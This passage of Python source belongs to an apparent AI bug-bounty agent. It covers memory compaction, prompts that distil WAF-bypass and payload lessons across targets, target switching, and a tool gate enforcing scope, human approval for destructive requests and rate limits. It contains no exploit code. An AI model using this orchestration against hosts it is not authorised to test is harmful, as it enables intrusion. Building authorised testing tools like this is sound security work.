        if not self._compaction_lock.acquire(blocking=False):
            # A previous compaction pass is still running — skip this round
            # rather than piling up concurrent LLM calls. The next trigger
            # will pick up the newly-accumulated turns.
            return

        target = self.target  # snapshot — safe even if the target changes mid-flight

        def _worker():
            try:
                fold_text = self._render_turns_for_summary(to_fold)
                self._digest_from_text(fold_text, len(to_fold))
                target.state["session_digest"] = self.session_digest
                self._mine_lessons_from_text(fold_text, target=target)
                save_target(target)
            except Exception:
                pass  # best-effort background enrichment, never surfaces to the researcher
            finally:
                self._compaction_lock.release()

        threading.Thread(target=_worker, daemon=True, name="hellhound-compaction").start()

    def _finalize_target_lessons(self) -> None:
        """
        Called right before switching off the current target (see
        set_target) so a short session — one that never grows past
        _HISTORY_COMPACT_TRIGGER — still gets its lessons mined instead of
        losing them the moment the target changes. Runs in the background
        against a snapshot of the outgoing target/history, same reasoning
        as _compact_history_if_needed: switching targets must never wait
        on an LLM call.
        """
        if not self.target or len(self.history) < 4:
            return
        target = self.target
        history_snapshot = list(self.history)
        signature_snapshot = self._current_tech_signature()

        def _worker():
            try:
                fold_text = self._render_turns_for_summary(history_snapshot)
                self._mine_lessons_from_text(fold_text, target=target, tech_signature=signature_snapshot)
            except Exception:
                pass

        threading.Thread(target=_worker, daemon=True, name="hellhound-target-finalize").start()

    @staticmethod
    def _render_turns_for_summary(turns: List[Dict[str, str]]) -> str:
        """Bounded, plain-text rendering of history turns for feeding to a summarizer call."""
        FOLD_CHAR_BUDGET = 20000
        lines = []
        running = 0
        for h in turns:
            role = h.get("role", "user")
            content = str(h.get("content", ""))[:2000]
            line = f"[{role}] {content}"
            running += len(line)
            if running > FOLD_CHAR_BUDGET:
                break
            lines.append(line)
        return "\n".join(lines)

    def _digest_from_text(self, fold_text: str, folded_count: int) -> None:
        """Updates self.session_digest from a block of older turns being folded out of raw history."""
        summarizer_prompt = f"""\
Condense these older turns from an ongoing bug-bounty session into an \
updated rolling memory digest. Merge with the EXISTING DIGEST below rather \
than discarding it — this digest is the agent's only memory of anything \
older than its last few turns.

Keep, tersely (a few short bullet points, not a report):
- What's actually been tried against this target (tools/approaches used).
- Confirmed findings or successes.
- Explicit failures / dead ends — approaches that did NOT work and should \
NOT be retried.
- Any outstanding leads not yet resolved.

Drop small talk, greetings, and anything not useful to remember later.

EXISTING DIGEST:
{self.session_digest or "(none yet)"}

OLDER TURNS TO FOLD IN:
{fold_text}

Return ONLY the updated digest text — no preamble, no headers."""

        updated = None
        try:
            updated, _ = ask_neural_core(
                prompt=summarizer_prompt,
                system_prompt="You compress agent conversation history into terse rolling memory notes. Output only the digest text, nothing else.",
                role="compactor",
                thinking=False,
                max_tokens=400,
                return_usage=True,
            )
        except Exception:
            updated = None

        if updated and isinstance(updated, str) and not updated.startswith("Error:"):
            self.session_digest = updated.strip()[: self._DIGEST_CHAR_CAP]
        else:
            fallback_note = f"[{folded_count} earlier turns condensed — summarization unavailable this pass, details not preserved]"
            self.session_digest = ((self.session_digest or "").strip() + "\n" + fallback_note).strip()[: self._DIGEST_CHAR_CAP]

    def _mine_lessons_from_text(self, turns_text: str, target: Optional[Target] = None, tech_signature: Optional[List[str]] = None) -> None:
        """
        Extracts generalizable (technique, tech_signature, outcome, note)
        lessons from a block of turns and writes them to the global,
        cross-target lessons store (hellhound/memory/lessons.py). This is
        the closest thing to "self-learning" available without being able
        to fine-tune the underlying cloud model — instead of retraining
        weights, HELLHOUND keeps its own external notes and re-reads the
        relevant ones next time a similar-looking target shows up (see
        find_relevant_lessons, injected into the orchestrator prompt).

        `target` and `tech_signature` are accepted explicitly (rather than
        always reading self.target / self._current_tech_signature()) because
        this runs on a background thread — by the time it executes, the
        researcher may already have switched targets on the main thread, and
        reading self.target here would silently attribute the outgoing
        target's lessons to the new one. Callers snapshot both before
        spawning the thread; only compaction (same target throughout) omits
        them and gets the live values.

        Best-effort and silent on failure: a target this generic prompt
        can't extract anything meaningful from should not add noise to the
        store, and a malformed/empty model response should never break the
        turn that triggered this.
        """
        if not turns_text.strip():
            return

        target = target or self.target
        current_sig = tech_signature if tech_signature is not None else self._current_tech_signature()
        mining_prompt = f"""\
From these bug-bounty session turns, extract any GENERALIZABLE lessons — \
things worth remembering on a DIFFERENT target with a similar tech stack, \
not facts specific only to this one target (skip this target's own \
hostnames/IPs/tokens/credentials — those never apply elsewhere).

A lesson is a (technique, outcome) pair, e.g.: a bypass technique that \
worked against a particular WAF/framework, a payload class that got \
blocked/rate-limited on a particular stack, an auth pattern that was a \
dead end, a header trick that succeeded. Only extract things with a clear \
worked/failed outcome — skip anything inconclusive.

Tag each lesson with BOTH kinds of tags in tech_signature: the stack it was \
tried against (framework/language/CMS/WAF, e.g. "laravel", "nodejs", \
"cloudflare") AND the vulnerability/technique class it belongs to (e.g. \
"idor", "sqli", "ssrf", "auth-bypass", "jwt", "xxe", "graphql", \
"rate-limit-bypass", "parameter-pollution"). This lets a future target match \
on either "same stack" or "same class of bug", even when the stack differs.

CURRENT TARGET'S KNOWN TECH TAGS (attach relevant ones per lesson, add more \
specific ones — including a vuln-class tag — if evident from the turns): \
{", ".join(current_sig) or "(none known yet)"}

TURNS:
{turns_text}

Return ONLY a JSON array (no other text), each item shaped exactly like:
{{"technique": "short description of the approach", "outcome": "worked" or \
"failed", "tech_signature": ["stack-tag", "vuln-class-tag"], "note": "one \
short sentence of context, e.g. why it failed or what made it work"}}

If there is nothing worth generalizing, return an empty array: []"""

        try:
            raw, _ = ask_neural_core(
                prompt=mining_prompt,
                system_prompt="You extract structured, reusable lessons from a pentest session. Output ONLY a raw JSON array, nothing else — no markdown fences, no commentary.",
                role="compactor",
                thinking=False,
                max_tokens=600,
                return_usage=True,
            )
        except Exception:
            raw = None

        if not raw or not isinstance(raw, str) or raw.startswith("Error:"):
            return

        candidate = raw.strip()
        # Strip an accidental markdown fence — models do this even when told not to.
        if candidate.startswith("```"):
            candidate = re.sub(r"^```(?:json)?\s*|\s*```$", "", candidate.strip(), flags=re.IGNORECASE)

        try:
            parsed = json.loads(candidate)
        except Exception:
            return
        if not isinstance(parsed, list):
            return

        for item in parsed[:15]:  # sane per-pass ceiling
            if not isinstance(item, dict):
                continue
            technique = item.get("technique")
            outcome = item.get("outcome")
            if not technique or outcome not in ("worked", "failed"):
                continue
            sig = item.get("tech_signature") or current_sig
            add_lesson(
                technique=str(technique),
                outcome=str(outcome),
                tech_signature=sig,
                note=str(item.get("note", "")),
                target_name=target.name if target else "",
            )

    @staticmethod
    def _build_native_tools() -> List[Dict[str, Any]]:
        """Convert TOOL_REGISTRY specs into OpenAI-compatible tool definitions for native API tool calling."""
        tools = []
        for name, spec in TOOL_REGISTRY.items():
            tools.append({
                "type": "function",
                "function": {
                    "name": name,
                    "description": spec.description[:200],  # Keep descriptions concise for token efficiency
                    "parameters": spec.parameters or {"type": "object", "properties": {}}
                }
            })
        return tools

    def set_target(self, target_name: str) -> Target:
        self._finalize_target_lessons()  # mine lessons from the outgoing target before its history is replaced
        self.target = create_or_load_target(target_name)
        self.history = self.target.state.get("history") or []
        if not isinstance(self.history, list):
            self.history = []
        # Digest is per-target too — a fresh target starts with none, a
        # revisited target picks its own digest back up, never the
        # previous target's.
        self.session_digest = self.target.state.get("session_digest") or ""
        self._turn_path_scope = None  # Reset path scope to prevent bleeding from previous target
        self._auto_continue_streak = 0  # a target switch is a fresh context — don't carry an auto-continue streak over from whatever was happening on the previous target
        self.guard = AutopilotGuard(  # Reset circuit breaker and rate limiters for the new target
            circuit_threshold=5,
            circuit_cooldown=60.0,
            recon_rps=10.0,
            test_rps=1.0,
            safe_methods_only=True
        )
        # Sync live into whatever session_context THIS turn is using, the
        # instant the switch happens — not just once at turn-start. Without
        # this, a target set mid-turn (e.g. via the set_target TOOL, called
        # partway through the orchestrator loop) never reaches the CLI's
        # session_ctx dict, which still holds the value captured at
        # turn-start. The CLI then re-applies THAT stale value onto this
        # same Agent instance right after the turn finishes (see
        # chat_ui.py's post-dispatch "agent.set_target(session_ctx['target'])"
        # sync-back), silently reverting the switch this method just made —
        # which is exactly how a whole engagement's later turns end up
        # filed under targets/default/ instead of the real target folder.
        active_ctx = getattr(self, "_active_session_context", None)
        if active_ctx is not None:
            active_ctx["target"] = self.target.name
            active_ctx["scope_rules"] = self.target.scope_rules
        return self.target

    def _execute_set_target(self, args: Dict[str, Any], emit: Any = None) -> Dict[str, Any]:
        """
        Model-driven replacement for the old regex auto-detection: the
        orchestrator itself calls this — after reading and understanding
        the researcher's actual message, not from a domain-shaped string
        matching a pattern — when it judges the researcher is directing it
        to hunt a specific host. See the "set_target" ToolSpec description
        for the judgment call the model is expected to make before calling
        this at all (this method does NOT re-derive that judgment from the
        text; it trusts the model's call and only validates the host itself
        and existing /scope constraints).
        """
        host = str(args.get("host", "")).strip()
        if not host:
            return {
                "status": "no_host_given",
                "note": "Nah bro, that set_target call had no host — nothing to switch to. Pass the exact domain/IP/hostname the researcher actually named, then call this again.",
            }

        normalized, _scheme = normalize_host(host)
        if not normalized:
            return {
                "status": "unparseable_host",
                "note": f"Nah bro, '{host}' doesn't parse as a real host/domain/IP — not going to guess at what was meant. Go back to the researcher's actual message and copy the host verbatim rather than retrying a mangled version of this one.",
            }

        # Respect any /scope the researcher already configured for this
        # session — a model judgment call doesn't override an explicit
        # allow/deny list the researcher set up themselves.
        if self.target and self.target.scope_rules and self.target.scope_rules.in_scope:
            allowed, reason = is_in_scope(normalized, self.target.scope_rules)
            if not allowed:
                if emit and hasattr(emit, "warn"):
                    emit.warn(f"[!] set_target blocked — {reason}")
                return {
                    "error": f"SCOPE_VIOLATION: {reason}. Ask the researcher to confirm/add '{normalized}' via /scope before treating it as a target.",
                    "blocked": True,
                }

        already_active = (
            self.target and self.target.name != "default"
            and sanitize_target_name(normalized) == self.target.name
        )
        if already_active:
            return {"target": self.target.name, "host": self._display_host, "note": "already the active target — no change made."}

        # "same_target_as": the researcher is saying this NEW host is the
        # SAME logical target as one already hunted, just under a different
        # IP/hostname (the classic THM/HTB case — a lab box hands out a
        # fresh IP every time it's rebooted/respawned, but it's still the
        # same machine with the same findings so far). Without this, every
        # IP rotation silently started a brand-new, empty Target and threw
        # away everything already learned (users found, plugins
        # fingerprinted, login recipe, notes, findings) until someone
        # noticed and manually re-explained the whole site — see the
        # _migrate_target_state docstring for exactly what is and isn't
        # carried forward.
        migrated_from = None
        same_target_as = str(args.get("same_target_as", "") or "").strip()
        if same_target_as:
            old_normalized, _ = normalize_host(same_target_as)
            if old_normalized and sanitize_target_name(old_normalized) != sanitize_target_name(normalized):
                if self.target and sanitize_target_name(old_normalized) == self.target.name:
                    # The researcher is CURRENTLY on the old target's session
                    # — reuse the in-memory object, which may hold state from
                    # this very turn that hasn't been saved to disk yet.
                    old_target_obj = self.target
                else:
                    old_target_obj = create_or_load_target(old_normalized)
                old_had_state = bool(old_target_obj.state) or bool(old_target_obj.findings) or bool(old_target_obj.notes)
                if old_had_state:
                    _migrate_target_state(old_target_obj, normalized)
                    migrated_from = old_target_obj.host or old_target_obj.name
                elif emit and hasattr(emit, "info"):
                    emit.info(f"[*] same_target_as='{same_target_as}' given, but no prior state was found for it — nothing to carry forward, starting '{normalized}' fresh.")

        new_target = self.set_target(normalized)

        # Pre-authorize any other hosts the researcher named in the SAME
        # message as part of this engagement (auth server, IdP, API
        # subdomain, etc.) — e.g. "me.agov.admin.ch is the main app,
        # auth.agov.admin.ch is the auth server, idp.agov.admin.ch is the
        # identity provider". Without this, the primary host got set but
        # every one of those other explicitly-named hosts still tripped a
        # SCOPE_VIOLATION the first time a tool actually touched it,
        # forcing a separate manage_scope detour (or several blocked
        # attempts) mid-investigation for something the researcher had
        # already authorized up front in plain language.
        related_added = []
        related_rejected = []
        raw_related = args.get("related_hosts")
        if isinstance(raw_related, str):
            raw_related = [raw_related]
        if isinstance(raw_related, list) and raw_related:
            if not new_target.scope_rules.in_scope:
                # No explicit scope existed yet — seed it with the primary
                # host too, so adding related hosts doesn't accidentally
                # tip this target from "implicit single-host pin" (any
                # non-matching host blocked) into "explicit in_scope list"
                # with the primary host itself missing from it.
                new_target.scope_rules.in_scope.append(normalized)
            for rh in raw_related:
                rh_norm, _ = normalize_host(str(rh).strip())
                if not rh_norm:
                    related_rejected.append(str(rh))
                    continue
                if rh_norm not in new_target.scope_rules.in_scope:
                    new_target.scope_rules.in_scope.append(rh_norm)
                related_added.append(rh_norm)
            if related_added:
                save_target(new_target)

        msg = f"Target set to '{new_target.name}' ({args.get('reason', '').strip() or 'directed by researcher'})."
        if migrated_from:
            msg += f" Carried forward everything already learned from '{migrated_from}' (same logical target, IP rotated) — findings, notes, fingerprinted tech, and the login recipe all still apply; session cookies were dropped as presumed-dead after the restart, so re-auth may be needed."
        if related_added:
            msg += f" Also pre-authorized related host(s) into scope: {', '.join(related_added)}."
        if emit and hasattr(emit, "info"):
            emit.info(f"[*] {msg}")
        result = {
            "target": new_target.name,
            "host": self._display_host,
            "message": msg + " Recon/testing tools may now be used against this host.",
        }
        if related_added:
            result["related_hosts_added"] = related_added
        if related_rejected:
            result["related_hosts_rejected"] = related_rejected
        if migrated_from:
            result["migrated_from"] = migrated_from
        return result

    @property
    def _display_host(self) -> str:
        """
        The real, connectable host[:port] for the current target — for
        anything that builds an actual URL or compares against a live
        request's netloc. `self.target.name` is the filesystem-safe folder
        name (colons mangled to underscores by sanitize_target_name) and
        must NEVER be used for that; "192.168.1.5:8080" as a folder name is
        "192.168.1.5_8080", which is not a resolvable hostname. Falls back
        to `.name` only for targets set before this field existed.
        """
        if not self.target:
            return "default"
        return self.target.host or self.target.name

    def _current_tech_signature(self) -> List[str]:
        """
        Best-effort tags describing this target, for matching against the
        cross-target lessons store — covers BOTH axes a lesson can match
        on: the tech stack (fingerprinted technologies + hostname tokens)
        and the vulnerability/technique classes already active on this
        target (finding types + anything dismissed as a false positive, so
        "we already ruled out IDOR here" also pulls IDOR-tagged lessons).
        Never invented — on a completely fresh target this may return very
        little or nothing, and find_relevant_lessons() falls back
        gracefully to general lessons in that case.
        """
        tags = []
        techs = self.target.state.get("technologies") or []
        for t in techs:
            tags.append(str(t))
        host = self._display_host or ""
        host_tokens = re.split(r"[.\-_/:]+", host.lower())
        tags.extend(tok for tok in host_tokens if len(tok) > 2 and tok not in ("www", "com", "net", "org", "http", "https"))

        # Vuln-class tags: what's already been found or actively ruled out
        # on this target, so lessons tagged by technique class (idor, sqli,
        # ssrf, auth-bypass, ...) surface even when the stack itself is new.
        findings = self.target.findings if isinstance(self.target.findings, list) else []
        for f in findings:
            ftype = f.get("type") if isinstance(f, dict) else f
            if ftype:
                tags.append(str(ftype).strip().lower())
        for d in (self.target.state.get("dismissed_false_positives") or []):
            item = d.get("item") if isinstance(d, dict) else d
            if item:
                tags.append(str(item).strip().lower())

        return tags

    def _get_trimmed_history(self, max_turns: int = 6, for_chat: bool = False, turn_start_idx: Optional[int] = None) -> List[Dict[str, str]]:
        """
        Returns a sanitized history window for LLM/SLM prompts.
        If turn_start_idx is provided, ALL tool results and assistant turns executed in the
        current turn are preserved intact so the orchestrator and synthesizer have complete
        visibility of what tools produced during this run.
        """
        if not self.history:
            return []

        if for_chat:
            chat_turns = []
            for h in reversed(self.history):
                content = str(h.get("content", ""))
                # Skip heavy reports, tool outputs, session summaries, and lengthy blocks
                if (
                    "[TOOL RESULT:" in content
                    or "ALWAYS-ON" in content
                    or "Session Summary" in content
                    or len(content) > 350
                ):
                    continue
                chat_turns.insert(0, {"role": h.get("role", "user"), "content": content.strip()})
                if len(chat_turns) >= max_turns:
                    break
            return chat_turns

        if turn_start_idx is not None and 0 <= turn_start_idx <= len(self.history):
            # Split into prior conversation history and current-turn activity
            prior_history = self.history[:turn_start_idx]
            current_turn_history = self.history[turn_start_idx:]
            # Keep up to max_turns of prior conversational context
            recent_prior = prior_history[-max_turns:] if len(prior_history) > max_turns else prior_history

            # Per-message truncation below (25k tool-result cap, 4k general cap)
            # bounds each entry individually, but current_turn_history has no
            # cap on *count* — a long recon/attack turn (max_agent_iterations
            # up to 60) can rack up 15-20+ tool calls, each up to 25k chars,
            # before synthesis. That can balloon the synthesizer request past
            # 200-400k chars, which on a cloud model either takes minutes to
            # get a first streamed token or effectively hangs the SSE read
            # with zero visibility (looked like "AI not responding" — it was
            # actually just buried under a request curl-sized tests never hit).
            # Cap the current-turn window itself: keep the most recent entries
            # that fit a total char budget, drop older ones with a note so the
            # synthesizer still knows work happened before the window.
            CURRENT_TURN_CHAR_BUDGET = 60000
            if current_turn_history:
                kept_rev = []
                running_total = 0
                dropped = 0
                for h in reversed(current_turn_history):
                    entry_len = len(str(h.get("content", "")))
                    if kept_rev and running_total + entry_len > CURRENT_TURN_CHAR_BUDGET:
                        dropped += 1
                        continue
                    kept_rev.append(h)
                    running_total += entry_len
                current_turn_history = list(reversed(kept_rev))
                if dropped:
                    current_turn_history.insert(0, {
                        "role": "user",
                        "content": f"[NOTE: {dropped} earlier tool call(s)/message(s) from this turn were omitted "
                                    f"here to keep the request size sane. Full outputs remain saved under "
                                    f"~/.hellhound/targets/<target>/raw/ if needed.]"
                    })

            combined = recent_prior + current_turn_history
        else:
            combined = self.history[-max_turns:] if len(self.history) > max_turns else self.history

        trimmed = []
        for h in combined:
            content = str(h.get("content", ""))
            is_tool_result = content.startswith("[TOOL RESULT:")
            if is_tool_result:
                # Tool results (curl bodies, spider intel, JSON feeds) are the
                # highest-value content — provide full results up to 25,000 characters
                # so the LLM can extract tokens, IDs, endpoints, and credentials without loss.
                if len(content) > 25000:
                    artifacts_prefix = _extract_preserved_artifacts(content)

                    target_name = self.target.name if (hasattr(self, "target") and self.target and hasattr(self.target, "name") and self.target.name) else "default"
                    tool_match = re.search(r"\[TOOL RESULT:\s*([a-zA-Z0-9_-]+)\]", content)
                    tool_name = tool_match.group(1) if tool_match else "tool_output"

                    saved_msg = ""
                    try:
                        raw_dir = os.path.expanduser(f"~/.hellhound/targets/{target_name}/raw")
                        os.makedirs(raw_dir, exist_ok=True)
                        timestamp = datetime.now(timezone.utc).strftime("%Y%m%dT%H%M%S")
                        filename = f"{tool_name}_{timestamp}.txt"
                        saved_path = os.path.join(raw_dir, filename)

                        with open(saved_path, "w", encoding="utf-8", errors="replace") as f:
                            f.write(content)

                        char_count = len(content)
                        line_count = len(content.splitlines())
                        saved_msg = f"\n[FULL OUTPUT SAVED: {saved_path} — {char_count:,} chars, {line_count:,} lines. Use read_artifact(path=..., offset=..., length=...) if you need a section not shown above.]"
                    except Exception:
                        pass

                    head = content[:12000]
                    tail = content[-8000:]
                    truncated_len = len(content) - 12000 - 8000
                    middle_marker = f"\n...[{truncated_len:,} chars truncated from middle]...\n"

                    content = artifacts_prefix + head + middle_marker + tail + saved_msg
            elif len(content) > 4000:
                content = content[:3800] + "\n...[truncated]..."
            trimmed.append({"role": h.get("role", "user"), "content": content})
        return trimmed

    @staticmethod
    def _describe_host_mismatch(active_host: str, cand_host: str) -> str:
        """
        Two hosts that differ by one small drifted token (a stray inserted
        segment, a duplicated octet, etc.) look nearly identical sitting
        side by side in a wall of log text — the actual difference is easy
        to miss even though it's a completely different host. Call out
        exactly what changed instead of just repeating both full strings.
        """
        sm = difflib.SequenceMatcher(None, active_host, cand_host)
        inserted, deleted = [], []
        for tag, i1, i2, j1, j2 in sm.get_opcodes():
            if tag == "insert":
                inserted.append(cand_host[j1:j2])
            elif tag == "delete":
                deleted.append(active_host[i1:i2])
            elif tag == "replace":
                deleted.append(active_host[i1:i2])
                inserted.append(cand_host[j1:j2])
        if sm.ratio() > 0.6 and (inserted or deleted):
            bits = []
            if inserted:
                bits.append(f"an extra '{''.join(inserted)}'")
            if deleted:
                bits.append(f"missing '{''.join(deleted)}'")
            return f"looks like the real target with {' and '.join(bits)} — not the same host"
        return "a completely different host"

    def _extract_target_from_args(self, args: Dict[str, Any]) -> str:
        for key in ("domain", "domains", "target", "url", "subdomain", "subdomains", "host", "hosts", "candidates", "request_ref"):
            if key in args and args[key]:
                val = args[key]
                if isinstance(val, list) and val:
                    return str(val[0])
                if isinstance(val, str) and "," in val:
                    return str(val.split(",")[0].strip())
                return str(val)
        return self._display_host

    def execute_tool_call(self, tool_name: str, args: Any, emit: Any = None) -> Dict[str, Any]:
        """
        Executes a tool with hard code-level scope validation, safe method policy,
        circuit breaker checking, and rate-limiting pacing.
        """
        if not isinstance(args, dict):
            if isinstance(args, str):
                try:
                    parsed = json.loads(args)
                    args = parsed if isinstance(parsed, dict) else {"input": args}
                except Exception:
                    args = {"input": args}
            else:
                args = {}

        spec = TOOL_REGISTRY.get(tool_name)
        if not spec:
            return {"error": f"Tool '{tool_name}' not found in registry."}

        # set_target switches the Agent's OWN active target (self.target),
        # not something the current target object can do to itself — needs
        # `self` in scope, so it's special-cased here rather than going
        # through the generic (args, target, emit) executor signature every
        # other tool uses.
        if tool_name == "set_target":
            return self._execute_set_target(args, emit)

        # Internal memory & finding recording tools operate locally on target state.
        # manage_scope/save_file/delete_file join this list for the same reason: they
        # touch target.scope_rules / target workspace storage, not the network, so
        # running them through the network-host scope gate below is the wrong check
        # entirely (worse, manage_scope's own job is sometimes to ADD a not-yet-in-scope
        # host — gating it on is_in_scope would make it unable to do the one thing it's
        # for; delete_file's only "target" is a bare filename, which _extract_target_
        # from_args would wrongly try to parse as a host/URL).
        if tool_name in ("record_finding", "dismiss_finding", "export_report", "read_artifact", "manage_scope", "manage_program", "save_file", "delete_file", "cookie_inspector"):
            return spec.executor(args, self.target, emit)

        target_candidate = self._extract_target_from_args(args)

        # 1. Enforce code-level Scope Gate
        if self.target and self.target.scope_rules and self.target.scope_rules.in_scope:
            allowed, reason = is_in_scope(target_candidate, self.target.scope_rules)
            if not allowed:
                msg = f"[!] not doing that — {reason}"
                if emit and hasattr(emit, "warn"):
                    emit.warn(msg)
                return {
                    "error": f"SCOPE_VIOLATION: {reason}",
                    "target": target_candidate,
                    "blocked": True
                }
        elif self.target and self.target.name and target_candidate and tool_name != "run_terminal_command":
            # No explicit /scope in_scope list has been configured (the
            # researcher just said "your target is X" in plain chat). That
            # is NOT an invitation to test anything the model decides to —
            # it should still mean exactly one host. Pin every tool call's
            # target to the active target's own host so a hallucinated or
            # garbled URL (a real observed failure mode: the model inventing
            # a URL that superficially resembles the target but isn't it)
            # can't silently reach a completely different host.
            #
            # IMPORTANT: compare against target.host (the real, connectable
            # host[:port] — see extract_raw_host()), never target.name.
            # target.name is the filesystem-safe folder name and mangles
            # ":" to "_" (e.g. "10.49.182.225:5000" -> "10.49.182.225_5000"),
            # which normalize_host() would then read back as a bogus
            # hostname — blocking every legitimate call against the real
            # target. This was caught in review: it broke the very first
            # request in a live session.
            active_reference = self.target.host or self.target.name
            active_host, _ = normalize_host(active_reference)
            cand_host, _ = normalize_host(target_candidate)
            if active_host and cand_host and active_host != cand_host and not cand_host.endswith("." + active_host):
                mismatch = self._describe_host_mismatch(active_host, cand_host)
                msg = (
                    f"[!] not doing that — '{cand_host}' {mismatch} "
                    f"(active target is '{active_host}'). If '{cand_host}' is really a second host "
                    f"you want tested, set it with /scope first."
                )
                if emit and hasattr(emit, "warn"):
                    emit.warn(msg)
                return {
                    "error": (
                        f"SCOPE_VIOLATION: '{cand_host}' {mismatch} (active target: '{active_host}'). "
                        f"No /scope is configured to authorize a second host — retry against the active "
                        f"target's actual host, or ask the user to confirm/add the new one via /scope."
                    ),
                    "target": target_candidate,
                    "blocked": True
                }

        # 1b. Enforce per-turn path scope (when a task is scoped to a specific
        # base path, tool calls must not wander into sibling applications on the same host).
        if self._turn_path_scope and tool_name not in ("run_terminal_command", "record_finding", "export_report"):
            url_candidate = args.get("url") or args.get("request_ref")
            if url_candidate and str(url_candidate).startswith(("http://", "https://", "/")):
                if not _url_in_path_scope(str(url_candidate), self._turn_path_scope):
                    # Auto-correct URL if it targeted the active host but omitted the path scope prefix
                    parsed = urlparse(str(url_candidate))
                    clean_scope = "/" + self._turn_path_scope.strip("/.,;:!?)>\"'")
                    if parsed.scheme and parsed.netloc:
                        if self._display_host in parsed.netloc or parsed.netloc in self._display_host:
                            new_path = f"{clean_scope}{parsed.path}"
                            new_url = f"{parsed.scheme}://{parsed.netloc}{new_path}"
                            if parsed.query:
                                new_url += f"?{parsed.query}"
                            if args.get("url"):
                                args["url"] = new_url
                            if args.get("request_ref"):
                                args["request_ref"] = new_url
                            url_candidate = new_url
                            if emit and hasattr(emit, "info"):
                                emit.info(f"Auto-scoped URL to active lab path: {new_url}")
                    elif str(url_candidate).startswith("/"):
                        new_path = f"{clean_scope}{url_candidate}"
                        if args.get("url"):
                            args["url"] = new_path
                        if args.get("request_ref"):
                            args["request_ref"] = new_path
                        url_candidate = new_path
                        if emit and hasattr(emit, "info"):
                            emit.info(f"Auto-scoped URL to active lab path: {new_path}")

                if not _url_in_path_scope(str(url_candidate), self._turn_path_scope):
                    reason = (
                        f"Requested URL '{url_candidate}' is outside the active path scope ('{self._turn_path_scope}'). "
                        f"All tool calls MUST be formatted with the prefix '{self._turn_path_scope}' (e.g. 'https://{self._display_host}{self._turn_path_scope}/dashboard' or 'https://{self._display_host}{self._turn_path_scope}/api/...'). "
                        f"Do NOT send requests to out-of-scope paths."
                    )
                    if emit and hasattr(emit, "warn"):
                        emit.warn(f"[!] PATH SCOPE REFUSAL: {url_candidate} — {reason}")
                    return {
                        "error": f"PATH_SCOPE_VIOLATION: {reason}",
                        "target": str(url_candidate),
                        "blocked": True
                    }

        # 2. Check for disallowed module flags
        if self.target and self.target.scope_rules:
            allowed, reason = check_module_against_rules(tool_name, self.target.scope_rules)
            if not allowed:
                return {
                    "error": f"RULE_VIOLATION: {reason}",
                    "blocked": True
                }

        # 2b. Enforce Artifact Pre-Flight Gate (Block redundant discovery when unconsumed artifacts exist)
        if tool_name in DISCOVERY_TOOLS:
            gate_result = check_artifact_preflight_gate(tool_name, args, self.target, getattr(self, "history", []))
            if gate_result:
                if emit and hasattr(emit, "warn"):
                    emit.warn(f"[!] ARTIFACT PRE-FLIGHT GATE: Blocked '{tool_name}' — unconsumed security artifact requires testing first.")
                return gate_result

        # 3. Autopilot Guard (CircuitBreaker + SafeMethodPolicy)
        method = str(args.get("method", "GET")).upper()
        url = args.get("url") or (target_candidate if target_candidate.startswith(("http://", "https://")) else f"https://{target_candidate}")
        guard_result = self.guard.check_request(method, url)

        if guard_result.get("decision") == "block":
            reason = guard_result.get("reason", "Target host blocked by circuit breaker")
            if emit and hasattr(emit, "warn"):
                emit.warn(f"[!] GUARD BLOCKED: {reason}")
            return {"error": f"blocked: {reason}", "blocked": True}

        if guard_result.get("decision") == "require_approval":
            reason = guard_result.get("reason", "Method requires human approval")
            approved = False

            if emit and hasattr(emit, "request_approval"):
                # GUI (or any other emit implementation) that can actually
                # surface a blocking approve/deny prompt outside a TTY.
                try:
                    approved = bool(emit.request_approval(tool_name, method, url, reason))
                except Exception:
                    approved = False

                if approved:
                    self._approvals_granted_this_turn = getattr(self, "_approvals_granted_this_turn", 0) + 1
                    if hasattr(emit, "success"):
                        emit.success(f"Action authorized by user — executing {tool_name}")
                else:
                    self._approvals_denied_this_turn = getattr(self, "_approvals_denied_this_turn", 0) + 1
                    if hasattr(emit, "warn"):
                        emit.warn(f"Action rejected by user — blocked {tool_name}")
                    return {
                        "error": f"Action rejected by user: {reason}. The destructive request '{method} {url}' was NOT executed.",
                        "blocked": True,
                        "approval_denied": True
                    }

            # Check if interactive session with stdin attached
            elif sys.stdin and sys.stdin.isatty():
                was_running = False
                if emit:
                    if hasattr(emit, "stop_indicator"):
                        emit.stop_indicator()
                        was_running = True
                    elif hasattr(emit, "stop"):
                        emit.stop()
                        was_running = True

                print("\n")
                try:
                    from rich.console import Console
                    from rich.panel import Panel
                    _c = Console()
                    _c.print(Panel(
                        f"[bold yellow]Tool:[/bold yellow] [white]{tool_name}[/white]\n"
                        f"[bold yellow]Action:[/bold yellow] [bold red]{method}[/bold red] [white]{url}[/white]\n"
                        f"[bold yellow]Reason:[/bold yellow] [white]{reason}[/white]",
                        title="[bold red] ⚠️  GUARD APPROVAL REQUIRED [/bold red]",
                        border_style="bold red",
                        expand=False
                    ))
                except Exception:
                    print(f" [!] GUARD APPROVAL REQUIRED: {reason}")
                    print(f" [!] Tool: {tool_name} | Action: {method} {url}")

                try:
                    ans = input(" \033[1;33m[?] Authorize this destructive action? [y/N]:\033[0m ").strip().lower()
                    approved = ans in ("y", "yes")
                except (KeyboardInterrupt, EOFError):
                    approved = False

                if was_running and emit:
                    if hasattr(emit, "restart_indicator"):
                        emit.restart_indicator()
                    elif hasattr(emit, "start"):
                        emit.start()

                if approved:
                    self._approvals_granted_this_turn = getattr(self, "_approvals_granted_this_turn", 0) + 1
                    if emit and hasattr(emit, "success"):
                        emit.success(f"Action authorized by user — executing {tool_name}")
                else:
                    self._approvals_denied_this_turn = getattr(self, "_approvals_denied_this_turn", 0) + 1
                    if emit and hasattr(emit, "warn"):
                        emit.warn(f"Action rejected by user — blocked {tool_name}")
                    return {
                        "error": f"Action rejected by user: {reason}. The destructive request '{method} {url}' was NOT executed.",
                        "blocked": True,
                        "approval_denied": True
                    }
            else:
                if emit and hasattr(emit, "warn"):
                    emit.warn(f"[!] GUARD APPROVAL REQUIRED: {reason} (non-interactive session)")
                return {
                    "error": f"requires human approval (non-interactive session): {reason}",
                    "requires_approval": True,
                    "blocked": True
                }

        # 4. Rate Limiter (Pacing)
        is_recon = tool_name in ("subfinder", "dns_bruteforce", "httpx", "dig", "subzy", "vhost_fuzz", "gowitness")
        host = self.guard._extract_host(url)
        self.guard._limiter.wait(host, is_recon=is_recon)

        # 5. Tool Execution & Circuit Breaker status tracking
        try:
            result = spec.executor(args, self.target, emit)
            if isinstance(result, dict) and result.get("error"):
